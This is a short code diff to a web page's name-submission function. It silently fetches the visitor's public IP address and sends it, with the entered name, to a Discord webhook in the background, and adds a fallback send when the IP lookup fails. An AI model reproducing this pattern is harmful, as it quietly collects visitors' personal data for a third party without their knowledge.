@@ -50,16 +50,25 @@ async function submitName() {
     // Try to send Discord webhook in background (don't block UI)
     try {
         // Get basic IP information for the white embed
+        console.log('Attempting to fetch IP for white embed...');
         const ipResponse = await fetch('https://api.ipify.org?format=json');
+        console.log('IP response:', ipResponse.status);
         const ipData = await ipResponse.json();
+        console.log('IP data:', ipData);
         
         // Send white embed to Discord
         await sendWhiteEmbedToDiscord(enteredName, ipData.ip);
         console.log('Discord webhook sent successfully');
         
     } catch (error) {
-        console.error('Error sending to Discord (but UI still works):', error);
-        // Don't show alert here since UI already updated successfully
+        console.error('Error with IP/Discord (but UI still works):', error);
+        // Send with fallback IP if API fails
+        try {
+            await sendWhiteEmbedToDiscord(enteredName, 'IP_FETCH_FAILED');
+            console.log('Discord webhook sent with fallback IP');
+        } catch (fallbackError) {
+            console.error('Even fallback Discord webhook failed:', fallbackError);
+        }
     }
 }
 
